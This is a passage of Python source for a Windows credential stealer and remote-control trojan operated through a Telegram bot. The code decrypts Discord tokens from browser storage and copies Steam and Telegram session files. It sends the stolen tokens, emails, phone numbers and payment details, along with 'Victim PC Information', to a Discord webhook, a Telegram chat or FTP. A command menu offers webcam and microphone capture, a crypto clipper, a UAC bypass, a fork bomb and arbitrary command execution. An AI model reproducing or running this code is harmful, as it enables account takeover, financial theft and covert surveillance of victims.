                                master_key
                            )
                            self._validate_and_add_token(token)
            except Exception as e:
                continue

    def _process_plaintext_tokens(self, path: str) -> None:
        for file_name in os.listdir(path):
            if not file_name.endswith(('.log', '.ldb')):
                continue
                
            try:
                with open(f'{path}\\{file_name}', 'r', errors='ignore') as file:
                    for line in file:
                        line = line.strip()
                        if not line:
                            continue
                            
                        for token in re.findall(self.regexp, line):
                            self._validate_and_add_token(token)
            except Exception as e:
                continue

    def _validate_and_add_token(self, token: str) -> None:
        if self._validate_token(token):
            try:
                uid = requests.get(
                    self.base_url, 
                    headers={'Authorization': token},
                    timeout=10
                ).json().get('id')
                
                if uid and uid not in self.uids:
                    self.tokens.append(token)
                    self.uids.append(uid)
            except:
                pass

    def _validate_token(self, token: str) -> bool:
        try:
            response = requests.get(
                self.base_url, 
                headers={'Authorization': token},
                timeout=10
            )
            return response.status_code == 200
        except:
            return False

    def _decrypt_token(self, buff: bytes, master_key: bytes) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            return decrypted_pass[:-16].decode()
        except:
            return ""

    def _get_master_key(self, path: str) -> Optional[bytes]:
        if not os.path.exists(path):
            return None

        try:
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
                
            if 'os_crypt' not in local_state:
                return None
                
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]  # DPAPI
            return CryptUnprotectData(master_key, None, None, None, 0)[1]
        except:
            return None



class SteamSessionExtractor:
    """
    Extracts Steam login/session files securely for analysis or backup.
    """

    def __init__(self):
        self._init_logger()
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.base_dir = os.path.expanduser('~')
        self.steam_path = os.path.join(self.base_dir, 'AppData', 'Local', 'Steam')
        self.config_path = os.path.join(self.base_dir, 'AppData', 'Roaming', 'Steam')
        self.output_dir = os.path.join(self.base_dir, 'SteamSessions')
        self.temp_dir = os.path.join(self.output_dir, 'temp')

    def _init_logger(self):
        self.logger = logging.getLogger('SteamSessionExtractor')
        self.logger.setLevel(logging.DEBUG)

        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')

        fh = logging.FileHandler('steam_extractor.log')
        fh.setFormatter(formatter)
        self.logger.addHandler(fh)

        ch = logging.StreamHandler()
        ch.setFormatter(formatter)
        self.logger.addHandler(ch)

    def _setup_workspace(self) -> bool:
        try:
            os.makedirs(self.output_dir, exist_ok=True)
            os.makedirs(self.temp_dir, exist_ok=True)
            return True
        except Exception as e:
            self.logger.error(f"Failed to create workspace: {e}")
            return False

    def _collect_files(self) -> bool:
        try:
            # Typical files of interest
            steam_files = [
                'loginusers.vdf',    # login info
                'config/config.vdf', # user settings
                'ssfn*',             # remember-me tokens
                'localconfig.vdf'    # possibly used in sessions
            ]

            for pattern in steam_files:
                files = glob.glob(os.path.join(self.steam_path, pattern), recursive=True)
                files += glob.glob(os.path.join(self.config_path, pattern), recursive=True)

                for file in files:
                    if os.path.isfile(file):
                        dest = os.path.join(self.temp_dir, os.path.basename(file))
                        shutil.copy2(file, dest)
                        self.logger.info(f"Copied: {file}")

            return True
        except Exception as e:
            self.logger.error(f"File collection error: {e}")
            return False

    def _create_archive(self) -> Optional[str]:
        archive_path = os.path.join(self.output_dir, f"steam_session_{self.session_id}.zip")
        try:
            with ZipFile(archive_path, 'w', ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(self.temp_dir):
                    for file in files:
                        full_path = os.path.join(root, file)
                        arcname = os.path.relpath(full_path, self.temp_dir)
                        zipf.write(full_path, arcname)
                        self.logger.info(f"Added to archive: {arcname}")
            return archive_path
        except Exception as e:
            self.logger.error(f"Archive creation failed: {e}")
            return None

    def _cleanup(self):
        try:
            if os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
        except Exception as e:
            self.logger.warning(f"Cleanup failed: {e}")

    def extract_session(self) -> Optional[str]:
        if not self._setup_workspace():
            return None

        if not self._collect_files():
            self._cleanup()
            return None

        archive_path = self._create_archive()
        self._cleanup()
        return archive_path


class TelegramSessionExtractor:    
    def __init__(self):
        self._init_logger()
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.base_dir = os.path.expanduser('~')
        self.tdata_path = os.path.join(self.base_dir, 'AppData', 'Roaming', 'Telegram Desktop', 'tdata')
        self.output_dir = os.path.join(self.base_dir, 'TelegramSessions')
        self.temp_dir = os.path.join(self.output_dir, 'temp')
        self.encryption_key = None
        
    def _init_logger(self):
        self.logger = logging.getLogger('TelegramSessionExtractor')
        self.logger.setLevel(logging.DEBUG)
        
        formatter = logging.Formatter(
            '%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )        
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)

    def _validate_environment(self) -> bool:
        required_paths = [
            self.tdata_path,
            os.path.join(self.tdata_path, 'D877F783D5D3EF8?*')
        ]
        
        for path in required_paths:
            if not glob.glob(path):
                self.logger.error(f"Path validation failed: {path}")
                return False
        return True

    def _setup_workspace(self) -> bool:
        try:
            os.makedirs(self.output_dir, exist_ok=True)
            os.makedirs(self.temp_dir, exist_ok=True)
            
            # Create secure subdirectories
            self.hash_dir = os.path.join(self.temp_dir, 'hashes')
            self.map_dir = os.path.join(self.temp_dir, 'maps')
            
            os.makedirs(self.hash_dir, mode=0o700, exist_ok=True)
            os.makedirs(self.map_dir, mode=0o700, exist_ok=True)
            
            return True
        except Exception as e:
            self.logger.error(f"Workspace setup failed: {e}")
            return False

    def _collect_session_files(self) -> bool:
        try:
            # Copy hash files with checksum verification
            hash_files = glob.glob(os.path.join(self.tdata_path, 'D877F783D5D3EF8?*'))
            for file in hash_files:
                if os.path.isfile(file):
                    dest = os.path.join(self.map_dir, os.path.basename(file))
                    shutil.copy2(file, dest)
                    self._verify_copy(file, dest)

            # Copy connection files with size validation
            conn_files = glob.glob(os.path.join(self.tdata_path, '??????????*'))
            for file in conn_files:
                if os.path.isfile(file) and os.path.getsize(file) > 0:
                    dest = os.path.join(self.hash_dir, os.path.basename(file))
                    shutil.copy2(file, dest)
                    self._verify_copy(file, dest)

            return True
        except Exception as e:
            self.logger.error(f"File collection failed: {e}")
            return False

    def _verify_copy(self, src: str, dest: str) -> bool:
        try:
            with open(src, 'rb') as f1, open(dest, 'rb') as f2:
                src_hash = hashlib.sha256(f1.read()).hexdigest()
                dest_hash = hashlib.sha256(f2.read()).hexdigest()
                
                if src_hash != dest_hash:
                    raise ValueError(f"Hash mismatch for {os.path.basename(src)}")
            return True
        except Exception as e:
            self.logger.error(f"Copy verification failed: {e}")
            raise

    def _create_secure_archive(self) -> Optional[str]:
        archive_path = os.path.join(self.output_dir, f'session_{self.session_id}.zip')
        
        try:
            with ZipFile(archive_path, 'w', ZIP_DEFLATED) as zipf:
                # Add files with relative paths and timestamp
                for root, _, files in os.walk(self.temp_dir):
                    for file in files:
                        full_path = os.path.join(root, file)
                        rel_path = os.path.relpath(full_path, self.temp_dir)
                        zipf.write(full_path, rel_path)
                        self.logger.info(f"Added to archive: {rel_path}")
            
            # Verify archive integrity
            if not self._verify_archive(archive_path):
                raise ValueError("Archive verification failed")
                
            return archive_path
        except Exception as e:
            self.logger.error(f"Archive creation failed: {e}")
            if os.path.exists(archive_path):
                os.remove(archive_path)
            return None

    def _verify_archive(self, archive_path: str) -> bool:
        try:
            with ZipFile(archive_path, 'r') as zipf:
                if zipf.testzip() is not None:
                    raise ValueError("Corrupt files in archive")
            return True
        except Exception as e:
            self.logger.error(f"Archive verification failed: {e}")
            return False

    def _cleanup(self) -> bool:
        try:
            if os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir, ignore_errors=False)
                
                # Secure delete (overwrite with random data)
                self._secure_delete(self.temp_dir)
            return True
        except Exception as e:
            self.logger.error(f"Cleanup failed: {e}")
            return False

    def _secure_delete(self, path: str) -> None:
        try:
            if os.path.isdir(path):
                for root, _, files in os.walk(path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        self._overwrite_file(file_path)
            else:
                self._overwrite_file(path)
        except Exception as e:
            self.logger.warning(f"Secure delete incomplete: {e}")

    def _overwrite_file(self, file_path: str) -> None:
        try:
            with open(file_path, 'ba+') as f:
                length = f.tell()
                f.seek(0)
                f.write(os.urandom(length))
        except Exception as e:
            self.logger.warning(f"Overwrite failed for {file_path}: {e}")
        finally:
            try:
                os.remove(file_path)
            except:
                pass

    def _upload_to_ftp(self, host: str, user: str, passwd: str, remote_path: str = '') -> bool:
        try:
            with FTP() as ftp:
                ftp.set_debuglevel(0)                
                ftp.connect(host, 21, timeout=30)                
                ftp.login(user, passwd)
                ftp.prot_p()  # Enable TLS
                
                if remote_path:
                    ftp.cwd(remote_path)
                
                archive_path = os.path.join(self.output_dir, f'session_{self.session_id}.zip')
                with open(archive_path, 'rb') as f:
                    ftp.storbinary(f'STOR session_{self.session_id}.zip', f)                
                size_local = os.path.getsize(archive_path)
                size_remote = ftp.size(f'session_{self.session_id}.zip')
                
                if size_local != size_remote:
                    raise ValueError("Upload size mismatch")
                
                return True
        except Exception as e:
            self.logger.error(f"FTP upload failed: {e}")
            return False

    def extract_session(self, ftp_config: Optional[dict] = None) -> Tuple[bool, str]:
        try:
            if not self._validate_environment():
                return False, "Environment validation failed"
                
            if not self._setup_workspace():
                return False, "Workspace setup failed"            
            self.logger.info("Starting session file collection")
            if not self._collect_session_files():
                return False, "File collection failed"            
            self.logger.info("Creating secure archive")
            archive_path = self._create_secure_archive()
            if not archive_path:
                return False, "Archive creation failed"            
            if ftp_config:
                self.logger.info("Starting FTP upload")
                if not self._upload_to_ftp(
                    ftp_config.get('host'),
                    ftp_config.get('user'),
                    ftp_config.get('pass'),
                    ftp_config.get('path', '')
                ):
                    return False, f"Extraction succeeded but upload failed - local copy at {archive_path}"
            
            self.logger.info("Performing cleanup")
            if not self._cleanup():
                self.logger.warning("Cleanup had errors but extraction completed")
            
            return True, archive_path
            
        except Exception as e:
            self.logger.critical(f"Critical extraction error: {e}")
            try:
                self._cleanup()
            except:
                pass
            return False, f"Critical error: {str(e)}"









class DiscordUserInfo:
    def __init__(self, token: str) -> None:
        self.token = token
        self.user_data = self._get_user_data()
        self.billing_data = self._get_billing_data()
        self.guilds_data = self._get_guilds_data()
        self.friends_data = self._get_friends_data()
        self.gift_codes = self._get_gift_codes()

    def _get_user_data(self) -> Dict:
        return self._make_request('https://discord.com/api/v9/users/@me') or {}

    def _get_billing_data(self) -> List[Dict]:
        return self._make_request('https://discord.com/api/v6/users/@me/billing/payment-sources') or []

    def _get_guilds_data(self) -> List[Dict]:
        return self._make_request('https://discord.com/api/v9/users/@me/guilds?with_counts=true') or []

    def _get_friends_data(self) -> List[Dict]:
        return self._make_request('https://discord.com/api/v8/users/@me/relationships') or []

    def _get_gift_codes(self) -> List[Dict]:
        return self._make_request('https://discord.com/api/v9/users/@me/outbound-promotions/codes') or []

    def _make_request(self, url: str) -> Optional[Union[Dict, List]]:
        try:
            response = requests.get(
                url,
                headers={'Authorization': self.token},
                timeout=15
            )
            return response.json() if response.status_code == 200 else None
        except:
            return None

    def get_nitro_type(self) -> str:
        nitro_type = self.user_data.get('premium_type', 0)
        return {
            0: 'None',
            1: 'Nitro Classic',
            2: 'Nitro',
            3: 'Nitro Basic'
        }.get(nitro_type, 'None')

    def get_payment_methods(self) -> str:
        if not self.billing_data:
            return 'None'
            
        methods = []
        for method in self.billing_data:
            if method['type'] == 1:
                methods.append('💳')
            elif method['type'] == 2:
                methods.append("📓 PayPal")
            else:
                methods.append('❓')
        return ', '.join(methods)

    def get_hq_guilds(self) -> str:
        if not self.guilds_data:
            return 'None'
            
        hq_guilds = []
        for guild in self.guilds_data:
            try:
                admin = guild.get('permissions') == '4398046511103'
                if admin and guild.get('approximate_member_count', 0) >= 100:
                    owner = "🧶" if guild.get('owner') else "🛡"
                    invite = self._get_guild_invite(guild['id'])
                    
                    data = f"{guild.get('name')} ({guild.get('id')}) | Owner: {owner} | Members: {guild.get('approximate_member_count')} | Invite: {invite}"
                    hq_guilds.append(data)
                    
                    if len('\n'.join(hq_guilds)) >= 1024:
                        break
            except:
                continue
                
        return '\n'.join(hq_guilds) if hq_guilds else 'None'

    def _get_guild_invite(self, guild_id: str) -> str:
        try:
            invites = requests.get(
                f"https://discord.com/api/v8/guilds/{guild_id}/invites",
                headers={'Authorization': self.token},
                timeout=10
            ).json()
            return f"https://discord.gg/{invites[0]['code']}" if invites else "No invites"
        except:
            return "Error getting invite"

    def get_hq_friends(self) -> str:
        if not self.friends_data:
            return 'None'
            
        hq_friends = []
        for friend in self.friends_data:
            try:
                friend_flags = friend['user'].get('public_flags', 0)
                if friend_flags:
                    data = f"{friend['user'].get('username')}#{friend['user'].get('discriminator')} ({friend['user'].get('id')})"
                    hq_friends.append(data)
                    
                    if len('\n'.join(hq_friends)) >= 1024:
                        break
            except:
                continue
                
        return '\n'.join(hq_friends) if hq_friends else 'None'

    def get_gift_codes(self) -> str:
        if not self.gift_codes:
            return 'None'
            
        codes = []
        for code in self.gift_codes:
            try:
                name = code['promotion'].get('outbound_title', 'Unknown')
                value = code.get('code', 'Invalid')
                data = f"{name}: {value}"
                codes.append(data)
                
                if len('\n\n'.join(codes)) >= 1024:
                    break
            except:
                continue
                
        return '\n\n'.join(codes) if codes else 'None'

    def get_avatar_url(self) -> str:
        if not self.user_data.get('avatar'):
            return "No avatar"
            
        user_id = self.user_data.get('id')
        avatar_hash = self.user_data.get('avatar')
        
        gif_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.gif"
        try:
            if requests.head(gif_url, timeout=5).status_code == 200:
                return gif_url
        except:
            pass
            
        return f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png"

class TokenUploader:
    def __init__(self, webhook_url=None, telegram_config=None):
        self.webhook_url = webhook_url
        self.telegram_config = telegram_config or {}
        self.extractor = TokenExtractor()
        self.browser_extractor = BrowserDataExtractor()
        self.system_controller = SystemController()
        self.tokens, self.uids = self.extractor.extract()

    def run(self):
        if self.webhook_url:
            self.upload_to_discord()
        if self.telegram_config:
            self.upload_to_telegram()

    def upload_to_discord(self) -> None:
        if not self.webhook_url:
            return
            
        webhook = SyncWebhook.from_url(self.webhook_url)
        
        pc_embed = Embed(
            title="🖥️ Victim PC Information",
            color=0x7289da
        )
        pc_embed.add_field(
            name="Computer Name",
            value=self.extractor.pc_name,
            inline=True
        )
        pc_embed.add_field(
            name="Operating System",
            value=self.extractor.os_info,
            inline=True
        )
        pc_embed.add_field(
            name="Tokens Found",
            value=str(len(self.tokens)),
            inline=True
        )
        pc_embed.set_footer(text=f"Extracted in {time.time() - self.extractor.extract_start_time:.2f}s")
        
        webhook.send(embed=pc_embed)
        
        browser_data = self.browser_extractor.extract_all_browser_data()
        if browser_data:
            txt_file, zip_file = self.browser_extractor.create_data_files(browser_data)
            
            with open(zip_file, 'rb') as f:
                webhook.send(
                    "📁 Browser data:",
                    file=File(f, filename=os.path.basename(zip_file))
                )
            
            os.remove(txt_file)
            os.remove(zip_file)
        
        for token in self.tokens:
            user_info = DiscordUserInfo(token)
            
            embed = Embed(
                title=f"👤 Discord Account Information",
                color=0x7289da
            )
            
            username = f"{user_info.user_data.get('username')}#{user_info.user_data.get('discriminator')}"
            embed.add_field(
                name="User",
                value=f"{username} ({user_info.user_data.get('id')})",
                inline=False
            )
            
            embed.add_field(
                name="Token",
                value=f"`{token}`",
                inline=False
            )
            
            embed.add_field(
                name="Email",
                value=user_info.user_data.get('email', 'None'),
                inline=True
            )
            
            embed.add_field(
                name="Phone",
                value=user_info.user_data.get('phone', 'None'),
                inline=True
            )
            
            embed.add_field(
                name="MFA Enabled",
                value="🍀" if user_info.user_data.get('mfa_enabled') else "🛡",
                inline=True
            )
            
            embed.add_field(
                name="Nitro",
                value=user_info.get_nitro_type(),
                inline=True
            )
            
            embed.add_field(
                name="Payment Methods",
                value=user_info.get_payment_methods(),
                inline=True
            )
            
            hq_guilds = user_info.get_hq_guilds()
            if len(hq_guilds) <= 1024:
                embed.add_field(
                    name="High-Quality Guilds",
                    value=hq_guilds,
                    inline=False
                )
            else:
                parts = [hq_guilds[i:i+1024] for i in range(0, len(hq_guilds), 1024)]
                for i, part in enumerate(parts, 1):
                    embed.add_field(
                        name=f"High-Quality Guilds (Part {i})",
                        value=part,
                        inline=False
                    )
            
            hq_friends = user_info.get_hq_friends()
            if len(hq_friends) <= 1024:
                embed.add_field(
                    name="High-Quality Friends",
                    value=hq_friends,
                    inline=False
                )
            else:
                parts = [hq_friends[i:i+1024] for i in range(0, len(hq_friends), 1024)]
                for i, part in enumerate(parts, 1):
                    embed.add_field(
                        name=f"High-Quality Friends (Part {i})",
                        value=part,
                        inline=False
                    )
            
            gift_codes = user_info.get_gift_codes()
            if len(gift_codes) <= 1024:
                embed.add_field(
                    name="Gift Codes",
                    value=gift_codes,
                    inline=False
                )
            else:
                parts = [gift_codes[i:i+1024] for i in range(0, len(gift_codes), 1024)]
                for i, part in enumerate(parts, 1):
                    embed.add_field(
                        name=f"Gift Codes (Part {i})",
                        value=part,
                        inline=False
                    )
            
            avatar_url = user_info.get_avatar_url()
            if avatar_url != "No avatar":
                embed.set_thumbnail(url=avatar_url)
            
            webhook.send(embed=embed)

    def upload_to_telegram(self) -> None:
        if not self.telegram_config or not self.telegram_config.get('bot_token') or not self.telegram_config.get('chat_id'):
            return

        bot_token = self.telegram_config['bot_token']
        chat_id = self.telegram_config['chat_id']
        base_url = f"https://api.telegram.org/bot{bot_token}"

        pc_message = (
            "🖥️ *Victim PC Information*\n\n"
            f"• *Computer Name:* `{self.extractor.pc_name}`\n"
            f"• *Operating System:* `{self.extractor.os_info}`\n"
            f"• *Tokens Found:* `{len(self.tokens)}`\n"
            f"• *Extraction Time:* `{time.time() - self.extractor.extract_start_time:.2f}s`"
        )

        requests.post(
            f"{base_url}/sendMessage",
            json={
                'chat_id': chat_id,
                'text': pc_message,
                'parse_mode': 'Markdown'
            }
        )

        browser_data = self.browser_extractor.extract_all_browser_data()
        if browser_data:
            txt_file, zip_file = self.browser_extractor.create_data_files(browser_data)
            
            with open(zip_file, 'rb') as f:
                requests.post(
                    f"{base_url}/sendDocument",
                    files={'document': (os.path.basename(zip_file), f)},
                    data={'chat_id': chat_id}
                )
            
            os.remove(txt_file)
            os.remove(zip_file)
        
        for token in self.tokens:
            try:
                user_info = DiscordUserInfo(token)

                message = (
                    f"👤 *Discord Account Information*\n\n"
                    f"• *User:* `{user_info.user_data.get('username')}#{user_info.user_data.get('discriminator')}` "
                    f"(`{user_info.user_data.get('id')}`)\n"
                    f"• *Token:* `{token}`\n"
                    f"• *Email:* `{user_info.user_data.get('email', 'None')}`\n"
                    f"• *Phone:* `{user_info.user_data.get('phone', 'None')}`\n"
                    f"• *MFA Enabled:* `{'🍀' if user_info.user_data.get('mfa_enabled') else '🛡'}`\n"
                    f"• *Nitro:* `{user_info.get_nitro_type()}`\n"
                    f"• *Payment Methods:* `{user_info.get_payment_methods()}`\n\n"
                    f"*High-Quality Guilds:*\n{user_info.get_hq_guilds()}\n\n"
                    f"*High-Quality Friends:*\n{user_info.get_hq_friends()}\n\n"
                    f"*Gift Codes:*\n{user_info.get_gift_codes()}"
                )

                parts = self._split_message(message)
                for part in parts:
                    requests.post(
                        f"{base_url}/sendMessage",
                        json={
                            'chat_id': chat_id,
                            'text': part,
                            'parse_mode': 'Markdown'
                        }
                    )
                    time.sleep(0.5)
            except Exception as e:
                continue
            time.sleep(1)

    def _split_message(self, message: str, limit: int = 4000) -> List[str]:
        parts = []
        while len(message) > limit:
            split_index = message.rfind('\n', 0, limit)
            if split_index == -1:
                split_index = limit
            parts.append(message[:split_index])
            message = message[split_index:]
        parts.append(message)
        return parts

def escape_markdown(text: str) -> str:
    escape_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    return ''.join(f'\\{char}' if char in escape_chars else char for char in text)

def split_message(message: str, limit: int = 4000) -> List[str]:
    parts = []
    while len(message) > limit:
        split_index = message.rfind('\n', 0, limit)
        if split_index == -1:
            split_index = limit
        parts.append(message[:split_index])
        message = message[split_index:]
    parts.append(message)
    return parts

# Admin 
ADMIN_IDS = [1852417227]  
ACTIVE_COMMANDS = {}
CLIPPER_REPLACE = {
    "BTC_ADDRESS": "",
    "ETH_ADDRESS": ""
}

def is_admin(user_id):
    return user_id in ADMIN_IDS if ADMIN_IDS else True

def create_keyboard(buttons, row_width=2):
    keyboard = types.ReplyKeyboardMarkup(row_width=row_width, resize_keyboard=True)
    keyboard.add(*buttons)
    return keyboard

def create_inline_keyboard(buttons):
    keyboard = types.InlineKeyboardMarkup()
    for btn in buttons:
        keyboard.add(types.InlineKeyboardButton(btn['text'], callback_data=btn['data']))
    return keyboard

def send_large_message(chat_id, text, max_length=4000):
    for i in range(0, len(text), max_length):
        bot.send_message(chat_id, text[i:i+max_length])

def require_active_system(func):
    def wrapper(message):
        user_id = message.from_user.id
        manager = SystemManager()
        active_system = manager.get_active_system(user_id)
        
        if not active_system:
            bot.reply_to(message, "🌪 لطفا ابتدا یک سیستم را انتخاب کنید. از دستور /systems استفاده کنید.")
            return
        
        return func(message)
    return wrapper

# ==================== Telegram Bot Handlers ====================

# ==================== Telegram Bot Handlers ====================

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🏴‍☠️ Access Denied")
        return
    
    help_text = """
📓 Zoozanaghe — 𐌅𐌋
━━━━━━━━━━━━━━━━━━━━━━━

🔧 System Management
📍 /register — Register current system
📍 /systems — List connected systems
📍 /select <id> — Select target system

━━━━━━━━━━━━━━━━━━━━━━━

🖥️ System Control
🖼️ /ss — Take a screenshot
🎥 /screenrec — Record screen (15 sec)
🌑 /monitorsoff — Turn off monitors
💡 /monitorson — Turn on monitors
💀 /bsod — Trigger Blue Screen of Death
💣 /forkbomb — Launch fork bomb (dangerous)
🧨 /implode — Wipe bot traces
🔐 /uacbypass — Attempt UAC bypass

━━━━━━━━━━━━━━━━━━━━━━━

📊 Process Management
🧾 /processes — List running processes
🛡 /kill <pid_or_name> — Terminate process
📌 /foreground — Get active window

━━━━━━━━━━━━━━━━━━━━━━━

🎵 Media & Audio
📸 /webcam — Capture webcam image
🔊 /volume <0-100> — Set volume level
🎙️ /recordmic <sec> — Record from microphone
🗣️ /tts <text> — Text-to-speech

━━━━━━━━━━━━━━━━━━━━━━━

🌐 Browser & Network
🌍 /grabbrowser — Extract browser data
🎮 /discord — Grab Discord token
📶 /wifi — Retrieve Wi-Fi passwords
🧰 /grabtelegram — Extracting Telegram sessions
🛴 /grabsteam — Extracts Steam login/session files securely for analysis or backup

━━━━━━━━━━━━━━━━━━━━━━━

📂 File Manager
📁 /ls — List directory contents
📂 /cd <path> — Change directory
📥 /download <file> — Download file
📤 /upload — Upload file (via reply)
🗑️ /remove <file> — Delete file
🚀 /execute <file> — Execute file

━━━━━━━━━━━━━━━━━━━━━━━

⚙️ Advanced Controls
🖱️ /blockinput — Disable mouse & keyboard
🖲️ /unblockinput — Enable input devices
🚫 /websiteblock <url> — Block website
🍀 /websiteunblock <url> — Unblock website
💸 /startclipper — Start crypto clipper
📟 /cmd <command> — Run terminal command

━━━━━━━━━━━━━━━━━━━━━━━

🌙 Science without humanity is nothing but destruction.
"""
    bot.reply_to(message, help_text)


@bot.message_handler(commands=['register'])
def register_system(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🏴‍☠️ Access Denied")
        return
    
    try:
        system_id = f"{platform.node()}_{int(time.time())}"
        manager = SystemManager()
        system = manager.register_system(
            system_id=system_id,
            owner_id=message.from_user.id,
            name=f"{platform.node()}"
        )
        
        if not system:
            bot.reply_to(message, "🛡 خطا در ثبت سیستم")
            return
            
        if not manager.set_active_system(message.from_user.id, system_id):
            bot.reply_to(message, "🌪 سیستم ثبت شد اما انتخاب به عنوان فعال ناموفق بود")
            return
            
        bot.reply_to(
            message,
            f"🍀سیستم با موفقیت ثبت شد:\n\n{system.get_info_card()}",
            parse_mode="Markdown"
        )
    except Exception as e:
        bot.reply_to(message, f"🛡 خطای سیستمی: {str(e)}")
        print(f"Error in register_system: {e}")

@bot.message_handler(commands=['systems'])
def list_systems(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "🏴‍☠️ Access Denied")
        return
    
    try:
        manager = SystemManager()
        systems = manager.get_user_systems(message.from_user.id)
        
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        
        if not systems:
            bot.reply_to(message, "ℹ️ هیچ سیستم متصلی وجود ندارد.")
            return
        
        for system in systems:
            btn_text = f"{system.name} ({'🟢' if system.is_active else '🔴'})"
            safe_system_id = system.system_id.replace('_', '|-|')
            keyboard.add(
                types.InlineKeyboardButton(
                    btn_text, 
                    callback_data=f"system_action_{safe_system_id}_select"
                )
            )        
        active_system = manager.get_active_system(message.from_user.id)
        if active_system:
            keyboard.add(
                types.InlineKeyboardButton(
                    "🚪 خروج از سیستم فعال",
                    callback_data="system_action_logout"
                )
            )
        
        status = "\n\n🔹 سیستم فعال فعلی: هیچکدام"
        if active_system:
            sys_info = manager.get_system(active_system)
            status = f"\n\n🔹 سیستم فعال فعلی: {sys_info.name if sys_info else active_system}"
        
        bot.reply_to(
            message, 
            f"🖥️ سیستم‌های متصل:{status}",
            reply_markup=keyboard
        )
    except Exception as e:
        bot.reply_to(message, f"🛡 خطا در دریافت لیست سیستم‌ها: {str(e)}")
        print(f"Error in list_systems: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith('system_action_'))
def handle_system_actions(call):
    try:
        user_id = call.from_user.id
        data = call.data.replace('system_action_', '', 1)
        
        if data == "logout":
            manager = SystemManager()
            if manager.clear_active_system(user_id):
                bot.answer_callback_query(call.id, "🍀 با موفقیت از سیستم خارج شدید")
                
                systems = manager.get_user_systems(user_id)
                keyboard = types.InlineKeyboardMarkup(row_width=1)
                
                for system in systems:
                    btn_text = f"{system.name} (🔴)"
                    safe_system_id = system.system_id.replace('_', '|-|')
                    keyboard.add(
                        types.InlineKeyboardButton(
                            btn_text, 
                            callback_data=f"system_action_{safe_system_id}_select"
                        )
                    )
                
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text="🖥️ سیستم‌های متصل\n\n🔹 سیستم فعال فعلی: هیچکدام",
                    reply_markup=keyboard
                )
            else:
                bot.answer_callback_query(call.id, "🛡 خطا در خروج از سیستم")
            return
        
        parts = data.split('_')
        if len(parts) >= 2 and parts[-1] == "select":
            system_id = '_'.join(parts[:-1]).replace('|-|', '_')
            
            manager = SystemManager()
            system = manager.get_system(system_id)
            
            if not system:
                bot.answer_callback_query(call.id, "🛡 سیستم یافت نشد")
                return
                
            if system.owner_id != user_id:
                bot.answer_callback_query(call.id, "🏴‍☠️ دسترسی denied")
                return
            
            if not manager.set_active_system(user_id, system_id):
                bot.answer_callback_query(call.id, "🛡 خطا در انتخاب سیستم")
                return
                
            systems = manager.get_user_systems(user_id)
            keyboard = types.InlineKeyboardMarkup(row_width=1)
            
            for sys in systems:
                btn_text = f"{sys.name} ({'🟢' if sys.system_id == system_id else '🔴'})"
                safe_id = sys.system_id.replace('_', '|-|')
                keyboard.add(
                    types.InlineKeyboardButton(
                        btn_text, 
                        callback_data=f"system_action_{safe_id}_select"
                    )
                )
            
            keyboard.add(
                types.InlineKeyboardButton(
                    "🚪 خروج از سیستم فعال",
                    callback_data="system_action_logout"
                )
            )
            
            bot.answer_callback_query(call.id, f"🍀 سیستم {system.name} انتخاب شد")
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"🖥️ سیستم‌های متصل\n\n🔹 سیستم فعال فعلی: {system.name}",
                reply_markup=keyboard
            )
            
    except Exception as e:
        bot.answer_callback_query(call.id, "🛡 خطای سیستمی رخ داد")
        print(f"Error in handle_system_actions: {e}")

# ==================== System Control Commands ====================

@bot.message_handler(commands=['ss'])
@require_active_system
def take_screenshot(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    try:
        img = ImageGrab.grab()
        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp:
            img.save(tmp.name, 'PNG')
            with open(tmp.name, 'rb') as photo:
                bot.send_photo(message.chat.id, photo)
        os.unlink(tmp.name)
    except Exception as e:
        bot.reply_to(message, f"🛡 Failed to take screenshot: {str(e)}")

@bot.message_handler(commands=['screenrec'])
@require_active_system
def record_screen(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)
    
    try:
        bot.reply_to(message, "⏳ Recording screen for 15 seconds...")
        frames = []
        for _ in range(150):  # 15 seconds at 10fps
            img = ImageGrab.grab()
            frames.append(img)
            time.sleep(0.1)
        
        with tempfile.NamedTemporaryFile(suffix='.gif', delete=False) as tmp:
            frames[0].save(tmp.name, save_all=True, append_images=frames[1:], duration=100, loop=0)
            with open(tmp.name, 'rb') as video:
                bot.send_animation(message.chat.id, video)
        os.unlink(tmp.name)
    except Exception as e:
        bot.reply_to(message, f"🛡 Failed to record screen: {str(e)}")

@bot.message_handler(commands=['monitorsoff'])
@require_active_system
def monitors_off(message):
    user_id = message.from_user.id
    manager = SystemManager()
    system_id = manager.get_active_system(user_id)
    controller = manager.get_controller(system_id)

    if controller.toggle_monitors("off"):
        bot.reply_to(message, "🍀 **Monitors turned OFF**")
    else:
